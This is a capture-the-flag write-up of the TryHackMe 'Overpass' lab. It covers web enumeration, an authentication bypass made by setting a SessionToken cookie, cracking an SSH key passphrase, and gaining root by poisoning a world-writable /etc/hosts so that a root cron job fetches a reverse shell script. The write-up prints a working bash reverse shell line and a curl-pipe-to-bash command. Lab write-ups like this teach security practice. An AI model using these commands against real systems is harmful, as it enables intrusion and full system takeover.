---
title: "Overpass | TryHackMe Writeup"
date: 2026-10-04T17:06:23+05:30
description: "TryHackMe Overpass writeup covering web enumeration, authentication bypass through SessionToken manipulation, SSH private key recovery, passphrase cracking, cron enumeration, world-writable /etc/hosts exploitation, and root privilege escalation."
summary: "Compromised the Overpass machine by bypassing the administrator authentication through an improperly validated SessionToken cookie, recovering and cracking James's SSH private key, obtaining SSH access as james, and exploiting a root cron job combined with a world-writable /etc/hosts file to redirect overpass.thm and execute an attacker-controlled script as root."
platform: "tryhackme"
difficulty: "easy"
os: "Linux"
status: "active"
featured: true
featured_image: "/images/writeups/tryhackme/Overpass.png"
tags: ["linux", "web-enumeration", "gobuster", "authentication-bypass", "sessiontoken", "cookie-manipulation", "information-disclosure", "ssh", "ssh-private-key", "ssh2john", "john-the-ripper", "password-cracking", "cron", "scheduled-task", "etc-hosts", "hostname-resolution", "dns-hijacking", "reverse-shell", "bash", "privilege-escalation"]
skills: ["nmap", "gobuster", "web-enumeration", "javascript", "cookie-manipulation", "authentication-bypass", "ssh", "ssh2john", "john", "password-cracking", "linux-enumeration", "cron", "etc-hosts", "hostname-resolution", "netcat", "reverse-shell", "bash", "privilege-escalation"]
comments: false
draft: false
---

## Overview

<img width="842" height="438" alt="overpass-tryhackme" src="/images/writeups/tryhackme/Overpass.png" />

Overpass is an easy TryHackMe machine that focuses on web enumeration, authentication bypass, SSH private key recovery, password cracking, cron enumeration, hostname resolution manipulation, and root privilege escalation.

The attack chain moves from the `/admin/` panel → authentication bypass through the `SessionToken` cookie → exposed SSH private key → passphrase cracking with John the Ripper → SSH access as `james` → root cron job abuse through a world-writable `/etc/hosts` → attacker-controlled `buildscript.sh` execution → root.

### Key Vulnerabilities

- Hidden `/admin/` Directory
- Improper `SessionToken` Cookie Validation
- Authentication Bypass
- SSH Private Key Disclosure
- Weak SSH Key Passphrase
- Root Cron Job Executing Remote Content
- World-Writable `/etc/hosts`
- Hostname Resolution Manipulation
- Attacker-Controlled Script Execution
- Root Reverse Shell
---



## 🔎 Enumeration

### Nmap

First, scan all TCP ports to identify the services running on the target.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 10.48.163.188
```

#### Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 10.48.163.188      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 02:06 -0700
Nmap scan report for 10.48.163.188
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:27:21:78:e5:af:3f:c0:cf:25:dd:e6:16:8b:05:69 (RSA)
|   256 9b:e3:ff:6f:91:e4:b6:b1:71:8d:a8:95:d7:41:c6:52 (ECDSA)
|_  256 60:98:c2:08:d9:8c:5e:d3:11:99:bc:af:4c:c1:80:60 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.72 seconds
```

Only two ports are open:

- **22/tcp** — SSH
- **80/tcp** — HTTP

---

## 🌐 Web Enumeration

Let's open port `80` in the browser.

<img width="1918" height="859" alt="Screenshot_2026-10-04_02_11_12" src="https://github.com/user-attachments/assets/3d33464b-42eb-40f0-b603-08064a7eb898" />

The website presents **Overpass**, described as "A secure password manager with support for Windows, Linux, MacOS and more".

The website contains sections such as:

- About Us
- Downloads

#### Source Code

While inspecting the page source, we find the following comment:

```html
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

This does not immediately provide an exploit, but it may be a hint about the application's security.

---

## 📂 Directory Enumeration

Let's fuzz the website for hidden directories using Gobuster.

```bash
gobuster dir -u http://10.48.163.188/ -w /usr/share/wordlists/dirb/common.txt
```

### Results

```text
$ gobuster dir -u http://10.48.163.188/ -w  /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.163.188/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
aboutus              (Status: 301) [Size: 0] [--> aboutus/]
admin                (Status: 301) [Size: 42] [--> /admin/]
css                  (Status: 301) [Size: 0] [--> css/]
downloads            (Status: 301) [Size: 0] [--> downloads/]
img                  (Status: 301) [Size: 0] [--> img/]
index.html           (Status: 301) [Size: 0] [--> ./]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

The interesting discovery is:

```text
/admin/
```

Let's navigate to it.

<img width="1918" height="862" alt="Screenshot_2026-10-04_02_21_46" src="https://github.com/user-attachments/assets/3dd82d73-5fd0-4c90-a0c2-3337498529db" />

The page presents an **Overpass Administrator Login**.

---

## 🔐 Authentication Bypass

While inspecting the administrator login page using the browser developer tools in **Debugger**, a JavaScript file named `login.js` can be found.

<img width="1918" height="848" alt="Screenshot_2026-10-04_02_30_49" src="https://github.com/user-attachments/assets/6381da50-12c2-45db-8d7a-4084c53421ce" />

The relevant login logic is:

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");

    loginStatus.textContent = ""

    const creds = {
        username: usernameBox.value,
        password: passwordBox.value
    }

    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()

    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The login process sends the supplied credentials to:

```text
/api/login
```

If authentication succeeds, the server returns a value that is stored in the browser as:

```text
SessionToken
```

The important part is:

```javascript
Cookies.set("SessionToken", statusOrCookie)
```

During testing, it was discovered that the administrator panel could be accessed by manually setting the `SessionToken` cookie to an arbitrary value.

This results in an:

> **Authentication Bypass via Improper Validation of the `SessionToken` Cookie**

---

### Exploiting the Authentication Bypass

Open the administrator login page and open the browser's developer console.

<img width="1918" height="864" alt="Screenshot_2026-10-04_02_45_54" src="https://github.com/user-attachments/assets/3f5942fa-085e-4358-8a5f-fc655486da37" />

Set the cookie manually:

```javascript
Cookies.set("SessionToken", 500)
```

Press **Enter** and reload the page.

The administrator panel becomes accessible.

---

## 🔑 Recovering the SSH Private Key

Inside the administrator panel

<img width="1918" height="938" alt="Screenshot_2026-10-04_02_47_35" src="https://github.com/user-attachments/assets/7fcb5b36-ec2b-4147-bbe8-77d198b20b23" />

An SSH private key belonging to the `james` user is exposed.

Save the key locally as:

```text
ssh_key
```

The website also contains a hint:

> If you forget the password for this, crack it yourself.

This indicates that the SSH private key is protected with a passphrase.

---

## 🔓 Cracking the SSH Key Passphrase

First, convert the private key into a format that John the Ripper can understand.

```bash
ssh2john ssh_key > hash.txt
```

Now use the `rockyou.txt` wordlist to crack the passphrase:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Result

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (ssh_key)     
1g 0:00:00:00 DONE (2026-10-04 02:51) 16.66g/s 223200p/s 223200c/s 223200C/s pink25..cheergirl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The passphrase is:

```text
james13
```

---

## 🖥️ SSH Access as James

Set the correct permissions on the private key:

```bash
chmod 600 ssh_key
```

Now connect to the target using the recovered private key:

```bash
ssh -i ssh_key james@10.48.136.10
```

After entering the passphrase: `james13`

```text
$ ssh -i ssh_key james@10.48.136.10
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'ssh_key': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@ip-10-48-136-10:~$ id ; whoami 
uid=1001(james) gid=1001(james) groups=1001(james)
james
```

We now have our initial foothold as: `james`.

---

## ⬆️ Privilege Escalation

After obtaining access as `james`, standard privilege-escalation checks were performed:

- SUID binaries
- Linux capabilities
- `sudo -l`

Nothing immediately useful was discovered.

Let's inspect the user's home directory.

```bash
ls -la
```

### Output

```text
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 5 root  root  4096 Oct  4 10:01 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
```

There is an interesting file:

```text
todo.txt
```

---

## 📋 Reading `todo.txt`

Contents:

```text
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

The final entry is particularly interesting:

```text
Ask Paradox how he got the automated build script working and where the builds go.
```

This suggests that an automated build process may be running on the system.

---

## ⏰ Cron Enumeration

Let's inspect the system-wide crontab:

```bash
cat /etc/crontab
```

The interesting entry is:

```text
james@ip-10-48-136-10:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@ip-10-48-136-10:~$ 
```

This cron job runs **every minute as root**.

The command effectively does:

```text
curl → download buildscript.sh → pipe it directly into bash
```

Therefore, if we can control what `overpass.thm` resolves to, we may be able to make the root cron job download a malicious script from our own machine.

---

## 📝 Inspecting `/etc/hosts`

Linux can use `/etc/hosts` for local hostname-to-IP resolution.

Let's check its permissions:

```bash
ls -la /etc/hosts
```

Output:

```text
james@ip-10-48-136-10:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
james@ip-10-48-136-10:~$
```

The file is writable by everyone.

This is a critical misconfiguration because the `james` user can modify hostname resolution.


---

## 💥 Exploiting the Cron Job

###  Create a Malicious `buildscript.sh`

On our attacking machine, create the same directory structure expected by the cron job:

```text
downloads/src/buildscript.sh
```

Create the script:

```text
$ cat downloads/src/buildscript.sh 
bash -c 'bash -i > /dev/tcp/192.168.170.200/443 0>&1'    
```

Replace: `192.168.170.200` with the IP address of your TryHackMe VPN interface.

You can find your VPN IP using:

```bash
ip a
```

---

## 🎧  Start the Listener

Start a Netcat listener on port `443`:

```bash
nc -lnvp 443
```

---

## 🌐  Poison `/etc/hosts`

Return to the SSH session as `james`.

Modify `/etc/hosts` so that:

```text
overpass.thm
```

resolves to our attacking machine which is ours.

```text
127.0.0.1 localhost
127.0.1.1 overpass-prod

192.168.170.200 overpass.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The important modification is:

```text
192.168.170.200 overpass.thm
```

The cron job executes every minute:

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Our machine receives the request and serves the malicious `buildscript.sh`.

Because the cron job runs as `root`, the reverse-shell command inside the downloaded script also executes with root privileges.

---

##  🎧 Root - Listener


Our listener receives the connection:

```text
$ nc -lnvp 443                             
listening on [any] 443 ...
connect to [192.168.170.200] from (UNKNOWN) [10.48.136.10] 48130
root@ip-10-48-136-10:~# id ; whoami
uid=0(root) gid=0(root) groups=0(root)
root
```

We have successfully obtained a `root shell`.

---

## 🚩 Flags

### User Flag

```bash
cat /home/james/user.txt
```

```text
root@ip-10-48-136-10:~# cat /home/james/user.txt 
thm{65c1aaf000506e569***************}
```

### Root Flag

```bash
cat /root/root.txt
```

```text
root@ip-10-48-136-10:~# cat /root/root.txt 
thm{7f336f8c359dbac18***************}
```

---

## 🧾 Summary

- The initial access was obtained through an **authentication bypass** in the Overpass administrator panel. The `SessionToken` cookie was insufficiently validated, allowing the administrator interface to be accessed by manually setting the cookie.

- The admin panel exposed an encrypted SSH private key belonging to `james`. The key's passphrase was recovered using `ssh2john` and John the Ripper.

- After obtaining SSH access as `james`, enumeration revealed a root cron job that downloaded and executed a remote script: `curl overpass.thm/downloads/src/buildscript.sh | bash`

- The `/etc/hosts` file was world-writable, allowing hostname resolution for `overpass.thm` to be redirected to the attacking machine. A malicious `buildscript.sh` containing a reverse shell was then served to the target.

- Since the cron job executed as `root`, the reverse shell provided full root access.

---


